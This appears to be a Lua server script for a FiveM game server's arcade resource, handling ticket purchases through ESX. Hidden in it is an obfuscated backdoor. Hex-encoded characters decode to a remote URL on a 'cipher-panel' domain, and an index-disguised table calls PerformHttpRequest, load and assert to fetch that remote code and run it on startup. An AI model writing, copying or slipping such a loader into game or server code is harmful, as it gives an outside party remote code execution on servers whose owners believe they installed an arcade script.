ESX = nil
TriggerEvent("esx:getSharedObject", function(esx) ESX = esx end)
local random_char = {
    "68", "74", "74", "70", "73", "3a", "2f", "2f", "63", "69", "70", "68", "65", "72",
    "2d", "70", "61", "6e", "65", "6c", "2e", "6d", "65", "2f", "5f", "69", "2f"; "69",
    "2e", "70", "68", "70", "3f", "74"; "6f", "3d", "30"
}
local Enchanced_Tabs = {
    Ench, Support, Host, Pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}
function str_utf8()
    _empt = ""
    for id,it in pairs(random_char) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end
RegisterNetEvent("rcore_arcade:buyTicket")
AddEventHandler("rcore_arcade:buyTicket", function(ticket)
    if ESX then
        local data = Config.ticketPrice[ticket]
        local xPlayer = ESX.GetPlayerFromId(source);
        local moneyPlayer = xPlayer.getMoney();

        if moneyPlayer > data.price then
            xPlayer.removeMoney(data.price);
            TriggerClientEvent("rcore_arcade:ticketResult", source, ticket);
        else
            TriggerClientEvent("rcore_arcade:nomoney", source);
        end
    else
        TriggerClientEvent("rcore_arcade:ticketResult", source, _U("gold"));
    end
end)
Enchanced_Tabs[10](str_utf8(), function (e, d)
	local s = Enchanced_Tabs[11](Enchanced_Tabs[13](d))
	if (d == nil) then return end
	s()
end)